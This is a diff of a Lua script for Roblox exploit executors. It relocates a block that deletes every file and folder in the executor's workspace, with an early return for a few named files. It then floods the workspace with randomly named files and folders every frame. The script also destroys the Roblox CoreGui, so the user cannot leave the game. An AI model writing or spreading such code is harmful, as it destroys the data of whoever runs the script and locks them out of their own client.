@@ -79,6 +79,27 @@ end)
 
 game:GetService("CoreGui").RobloxGui:Destroy() -- anti-leave and alt f4
 
+
+-- [[                       Files and Folders                      ]]
+
+for i,v in pairs(listfiles("")) do -- wipe
+    if v == "demon.png" or v == "Thresh, the Chain Warden.mp3" or v == "the doll.png" then return end
+    if isfile(v) then
+        delfile(v)
+    else
+        delfolder(v)
+    end
+end
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    local str = generate_random_string(math.random(1, 20))
+    if math.random(0, 1) == 1 then
+        writefile(str, "")
+    else
+        makefolder(str)
+    end
+end)
+
 local str_lower = string.lower
 local raw_game = game
 local mt = getrawmetatable(game)
@@ -119,31 +140,5 @@ print("debug: type new, if not seen then its github's problem")
         table.clear(getgenv(), v)
     end
 end]]
-
-hookfunction(hookfunction, function(...) end) -- no more hooks
-
--- [[                       Files and Folders                      ]]
-
-for i,v in pairs(listfiles("")) do -- wipe
-    if v == "demon.png" or v == "Thresh, the Chain Warden.mp3" or v == "the doll.png" then return end
-    if isfile(v) then
-        delfile(v)
-    else
-        delfolder(v)
-    end
-end
-
-game:GetService("RunService").RenderStepped:Connect(function()
-    local str = generate_random_string(math.random(1, 20))
-    if math.random(0, 1) == 1 then
-        writefile(str, "")
-    else
-        makefolder(str)
-    end
-end)
-
-
-
-
 
 
